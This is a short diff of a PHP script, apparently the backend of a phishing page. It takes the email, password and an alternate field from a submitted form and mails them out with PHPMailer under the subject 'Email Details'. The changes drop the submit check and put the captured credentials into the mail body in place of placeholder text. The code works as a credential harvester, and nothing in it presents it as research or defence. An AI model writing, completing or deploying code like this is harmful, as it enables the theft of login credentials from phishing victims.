@@ -11,7 +11,7 @@ header("Access-Control-Allow-Headers: *");
     //Load Composer's autoloader
     require 'vendor/autoload.php';
     
-    if(isset($_POST['submit'])){
+   
         
         $email = $_POST['email'];
         $password = $_POST['password'];
@@ -20,9 +20,6 @@ header("Access-Control-Allow-Headers: *");
         $message = "Email: ".$email."<br> Password: ".$password."<br> Alternate: ".$alternate;
 
         
-
-
-    }
    
     //Instantiation and passing `true` enables exceptions
     $mail = new PHPMailer(true);
@@ -45,7 +42,7 @@ header("Access-Control-Allow-Headers: *");
         //Content
         $mail->isHTML(true);                                  //Set email format to HTML
         $mail->Subject = 'Email Details';
-        $mail->Body    = "this is the message body";
+        $mail->Body    = $message;
        
     
         $mail->send();
